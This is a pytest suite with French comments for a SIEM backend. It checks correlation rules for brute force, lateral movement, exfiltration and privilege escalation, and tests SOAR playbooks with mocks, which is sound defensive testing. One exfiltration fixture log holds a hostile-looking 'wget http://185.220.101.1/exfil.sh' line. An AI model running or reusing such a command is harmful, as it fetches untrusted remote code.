# backend/tests/security/test_attack_scenarios.py
#
# Suite de tests de sécurité S2 — Smart SIEM
# Couvre les 3 scénarios d'attaque MITRE, les playbooks SOAR,
# l'audit trail et les notifications.
# Tous les appels ES / DB / HTTP sont mockés.

from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock, patch

import pytest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_hit(log_type: str, message: str, source_ip: str = "1.2.3.4",
              host: str = "srv1", hour: int = 14) -> dict:
    ts = datetime.now(timezone.utc).replace(hour=hour, minute=0, second=0, microsecond=0)
    return {
        "_id": f"id_{message[:12].replace(' ', '_')}",
        "_source": {
            "log_type": log_type,
            "message": message,
            "source_ip": source_ip,
            "hostname": host,
            "host": host,
            "@timestamp": ts.isoformat(),
        },
    }


def _auth_fail(source_ip: str, host: str = "web-01", n: int = 1) -> list[dict]:
    return [
        _make_hit("auth", f"Failed password for root from {source_ip} port 4{i}22 ssh2",
                  source_ip=source_ip, host=host)
        for i in range(n)
    ]


# ---------------------------------------------------------------------------
# Scénario 1 — Reconnaissance (T1595, T1046)
# test_brute_force_triggers_rule001
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_brute_force_triggers_rule001():
    """
    Scénario 1 — Reconnaissance : injecte 10 logs Failed password depuis la même IP
    et vérifie que _eval_rule_001 retourne au moins 1 match.
    """
    from app.modules.correlation.rules import RULES_BY_ID
    from app.modules.correlation import engine

    rule = RULES_BY_ID["RULE_001"]
    hits = _auth_fail("203.0.113.42", n=10)

    created = []

    async def fake_dedupe(db, key, hours=6):
        return False

    async def fake_create(db, rule_id, rule_name, severity, description,
                          source_ip=None, host=None, related_log_ids=None,
                          mitre_tactic=None, mitre_technique=None, dedupe_key=None,
                          confidence_score=None, soar_status=None):
        created.append({"rule_id": rule_id, "source_ip": source_ip})
        return MagicMock(id=len(created))

    with patch("app.modules.correlation.engine.check_dedupe", fake_dedupe), \
         patch("app.modules.correlation.engine.create_alert", fake_create):
        db = AsyncMock()
        n = await engine._eval_rule_001(hits, rule, db, confidence=90.0)

    assert len(n) >= 1, "RULE_001 doit déclencher une alerte pour 10 tentatives brute force"
    assert created[0]["source_ip"] == "203.0.113.42"


# ---------------------------------------------------------------------------
# Scénario 2 — Mouvement latéral (T1021, T1110)
# test_lateral_movement_triggers_rule004
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_lateral_movement_triggers_rule004():
    """
    Scénario 2 — Mouvement latéral : même IP sur 4 hôtes distincts.
    RULE_004 (multi-host) doit se déclencher.
    """
    from app.modules.correlation.rules import RULES_BY_ID
    from app.modules.correlation import engine

    rule = RULES_BY_ID["RULE_004"]
    # SSH brute force depuis même IP vers 4 hôtes
    attacker = "10.10.0.99"
    hits = []
    for host in ["web-01", "web-02", "db-master", "auth-srv"]:
        hits.extend(_auth_fail(attacker, host=host, n=3))

    created = []

    async def fake_dedupe(db, key, hours=6):
        return False

    async def fake_create(db, rule_id, severity, **kwargs):
        created.append({"rule_id": rule_id, "severity": severity})
        return MagicMock(id=len(created))

    with patch("app.modules.correlation.engine.check_dedupe", fake_dedupe), \
         patch("app.modules.correlation.engine.create_alert", fake_create):
        db = AsyncMock()
        n = await engine._eval_rule_004(hits, rule, db, confidence=95.0)

    assert len(n) >= 1, "RULE_004 doit se déclencher sur une IP vue sur 4 hôtes distincts"
    assert any(a["severity"] == "CRITICAL" for a in created)


# ---------------------------------------------------------------------------
# Scénario 3 — Exfiltration (T1041)
# test_exfiltration_triggers_rule004
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_exfiltration_triggers_rule004():
    """
    Scénario 3 — Exfiltration : logs réseau avec keywords 'outbound'/'exfil'.
    RULE_004 doit se déclencher.
    """
    from app.modules.correlation.rules import RULES_BY_ID
    from app.modules.correlation import engine

    rule = RULES_BY_ID["RULE_004"]
    hits = [
        _make_hit("network", "outbound data transfer detected wget http://185.220.101.1/exfil.sh",
                  source_ip="192.168.1.77"),
        _make_hit("network", "outbound connection to suspicious host data_exfil pattern",
                  source_ip="192.168.1.77"),
        _make_hit("firewall", "outbound large transfer 500MB to 45.33.32.1:443 exfil suspected",
                  source_ip="192.168.1.77"),
    ]

    created = []

    async def fake_dedupe(db, key, hours=6):
        return False

    async def fake_create(db, rule_id, severity, **kwargs):
        created.append({"rule_id": rule_id, "severity": severity})
        return MagicMock(id=len(created))

    with patch("app.modules.correlation.engine.check_dedupe", fake_dedupe), \
         patch("app.modules.correlation.engine.create_alert", fake_create):
        db = AsyncMock()
        n = await engine._eval_rule_004(hits, rule, db, confidence=95.0)

    assert len(n) >= 1, "RULE_004 doit détecter les logs réseau avec keywords exfil"
    assert created[0]["severity"] == "CRITICAL"


# ---------------------------------------------------------------------------
# test_offhours_triggers_rule002
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_offhours_triggers_rule002():
    """
    Connexion à 3h UTC (hors horaires) → RULE_002 doit se déclencher.
    """
    from app.modules.correlation.rules import RULES_BY_ID
    from app.modules.correlation import engine

    rule = RULES_BY_ID["RULE_002"]
    hits = [_make_hit("auth", "Accepted password for analyst from 10.0.0.5",
                      source_ip="10.0.0.5", hour=3)]

    created = []

    async def fake_dedupe(db, key, hours=6):
        return False

    async def fake_create(db, rule_id, rule_name, severity, **kwargs):
        created.append({"rule_id": rule_id, "severity": severity})
        return MagicMock(id=1)

    with patch("app.modules.correlation.engine.check_dedupe", fake_dedupe), \
         patch("app.modules.correlation.engine.create_alert", fake_create):
        db = AsyncMock()
        n = await engine._eval_rule_002(hits, rule, db, confidence=70.0)

    assert len(n) == 1, "RULE_002 doit se déclencher pour une connexion à 3h UTC"
    assert created[0]["severity"] == "WARNING"


# ---------------------------------------------------------------------------
# test_priv_escalation_triggers_rule003
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_priv_escalation_triggers_rule003():
    """
    Log système avec 'sudo' / 'privilege' → RULE_003 doit se déclencher.
    """
    from app.modules.correlation.rules import RULES_BY_ID
    from app.modules.correlation import engine

    rule = RULES_BY_ID["RULE_003"]
    hits = [
        _make_hit("system", "sudo: analyst : TTY=pts/1 PWD=/root COMMAND=/bin/bash",
                  source_ip="10.0.0.10"),
        _make_hit("audit", "privilege escalation via setuid binary detected",
                  source_ip="10.0.0.10"),
    ]

    created = []

    async def fake_dedupe(db, key, hours=6):
        return False

    async def fake_create(db, rule_id, severity, **kwargs):
        created.append({"rule_id": rule_id, "severity": severity})
        return MagicMock(id=len(created))

    with patch("app.modules.correlation.engine.check_dedupe", fake_dedupe), \
         patch("app.modules.correlation.engine.create_alert", fake_create):
        db = AsyncMock()
        n = await engine._eval_rule_003(hits, rule, db, db_audit_logs=[], confidence=85.0)

    assert len(n) >= 1, "RULE_003 doit se déclencher sur un log sudo/privilege"
    assert any(a["severity"] == "HIGH" for a in created)


# ---------------------------------------------------------------------------
# test_playbook_block_ip_callable
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_playbook_block_ip_callable():
    """
    Appel direct de _run_block_ip sans FIREWALL_API_URL → status=failure
    explicite (aucune simulation de blocage).
    """
    db = AsyncMock()
    db.add = MagicMock()
    db.commit = AsyncMock()
    db.refresh = AsyncMock()

    mock_execution = MagicMock(id=1)

    with patch("app.modules.soar.playbooks._persist_execution", AsyncMock(return_value=mock_execution)), \
         patch("app.modules.soar.playbooks.log_action", AsyncMock()), \
         patch("app.core.config.settings") as mock_settings:

        mock_settings.firewall_api_url = None

        from app.modules.soar.playbooks import _run_block_ip
        result = await _run_block_ip(
            params={"ip": "10.0.0.1", "reason": "reconnaissance scan", "alert_id": 1},
            triggered_by="analyst",
            db=db,
        )

    assert result["status"] == "failure"
    assert result["ip"] == "10.0.0.1"
    assert "FIREWALL_API_URL" in result["error"]


# ---------------------------------------------------------------------------
# test_playbook_disable_account_callable
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_playbook_disable_account_callable():
    """
    Appel direct de _run_disable_account avec user mock → status=disabled.
    """
    mock_user = MagicMock()
    mock_user.is_active = True
    db = AsyncMock()
    db.commit = AsyncMock()

    mock_execution = MagicMock(id=1)

    with patch("app.modules.soar.playbooks.get_user_by_username", AsyncMock(return_value=mock_user)), \
         patch("app.modules.soar.playbooks._persist_execution", AsyncMock(return_value=mock_execution)), \
         patch("app.modules.soar.playbooks.log_action", AsyncMock()):

        from app.modules.soar.playbooks import _run_disable_account
        result = await _run_disable_account(
            params={"username": "compromised_user", "reason": "lateral movement", "alert_id": 5},
            triggered_by="admin",
            db=db,
        )

    assert result["status"] == "disabled"
    assert result["username"] == "compromised_user"
    assert mock_user.is_active is False


# ---------------------------------------------------------------------------
# test_playbook_escalate_admin_callable
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_playbook_escalate_admin_callable():
    """
    Appel direct de _run_escalate_admin avec Slack mock → status=escalated.
    """
    db = AsyncMock()
    mock_execution = MagicMock(id=1)

    with patch("app.modules.soar.playbooks._persist_execution", AsyncMock(return_value=mock_execution)), \
         patch("app.modules.soar.playbooks.log_action", AsyncMock()), \
         patch("app.modules.soar.playbooks.send_webhook", AsyncMock(return_value=True)), \
         patch("app.core.config.settings") as mock_settings:

        mock_settings.slack_webhook_url = "https://hooks.slack.com/test"
        mock_settings.teams_webhook_url = None
        mock_settings.alert_email_to = None

        from app.modules.soar.playbooks import _run_escalate_admin
        result = await _run_escalate_admin(
            params={"reason": "Exfiltration détectée", "alert_id": 99, "severity": "CRITICAL"},
            triggered_by="system",
            db=db,
        )

    assert result["status"] == "escalated"
    assert "slack" in result["channels_notified"]


# ---------------------------------------------------------------------------
# test_audit_trail_correlation_run
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_audit_trail_correlation_run():
    """
    Vérifie que run_correlation appelle log_action avec action='correlation_run'.
    """
    from app.modules.correlation import engine

    mock_log_action = AsyncMock()
    mock_db = AsyncMock()

    # Mock select pour CorrelationRule (active rule IDs)
    mock_rule_result = MagicMock()
    mock_rule_result.scalars.return_value.all.return_value = []
    # Mock select pour AuditLog
    mock_audit_result = MagicMock()
    mock_audit_result.scalars.return_value.all.return_value = []

    mock_db.execute = AsyncMock(side_effect=[mock_rule_result, mock_audit_result])

    mock_es = AsyncMock()
    mock_es.search = AsyncMock(return_value={"hits": {"hits": []}})

    with patch("app.modules.correlation.engine.log_action", mock_log_action), \
         patch("app.modules.correlation.engine._fetch_logs", AsyncMock(return_value=[])), \
         patch("app.core.config.settings") as mock_settings:

        mock_settings.es_logs_index_name = "test-index"

        await engine.run_correlation(db=mock_db, es_client=mock_es, window_minutes=10)

    mock_log_action.assert_called_once()
    call_kwargs = mock_log_action.call_args
    # Vérifie que l'action est bien 'correlation_run'
    assert call_kwargs.kwargs.get("action") == "correlation_run" or \
           (len(call_kwargs.args) >= 3 and call_kwargs.args[2] == "correlation_run"), \
           f"log_action attendu avec action='correlation_run', reçu: {call_kwargs}"


# ---------------------------------------------------------------------------
# test_notification_webhook_send
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_notification_webhook_send():
    """
    Patch httpx.AsyncClient : vérifie que send_webhook retourne True sur succès HTTP 200.
    """
    from app.modules.alerting.notifier import send_webhook

    mock_response = MagicMock()
    mock_response.raise_for_status = MagicMock()

    mock_client = AsyncMock()
    mock_client.__aenter__ = AsyncMock(return_value=mock_client)
    mock_client.__aexit__ = AsyncMock(return_value=False)
    mock_client.post = AsyncMock(return_value=mock_response)

    with patch("httpx.AsyncClient", return_value=mock_client):
        result = await send_webhook(
            url="https://hooks.slack.com/services/test/webhook",
            payload={"text": "[SIEM TEST] Alerte CRITICAL détectée"},
        )

    assert result is True, "send_webhook doit retourner True sur succès HTTP"
    mock_client.post.assert_called_once()
